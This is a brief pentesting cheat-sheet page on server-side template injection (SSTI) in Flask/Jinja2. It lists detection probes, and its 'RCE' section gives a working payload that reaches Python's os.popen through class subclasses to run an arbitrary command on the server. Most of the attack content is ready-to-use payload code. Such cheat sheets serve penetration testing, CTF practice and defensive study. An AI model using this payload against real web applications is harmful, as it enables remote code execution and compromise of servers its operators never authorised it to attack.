---
description: >-
  SSTI (Server Side Templates Injections) occurs when an attacker is able to use
  native template syntax to inject a malicious payload into a template, which is
  then executed server-side.
---

# Templates Injections ✖️

There are different **frameworks** that uses **templates**, this guide could help to detect which is and exploit them.

![Methodology from PayloadsAllTheThings](../.gitbook/assets/ssti_graph.png)

## Flask

Flask is a framework for web applications written in Python and developed from the Werkzeug and Jinja2 tools.

### Syntax SSTI

```text
{{7*7}}
{{ varname }}
{% if 1=1 %}PRINT{%else%}NOPRINT{%endif%}
```

### RCE \(Remote Code Execution\)

```text
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("COMMAND").read()}}{%endif%}{%endfor%}
```

To bypass some restrictions take a look at the following resources:

## References

* [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
* [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
* h[ttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection\#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

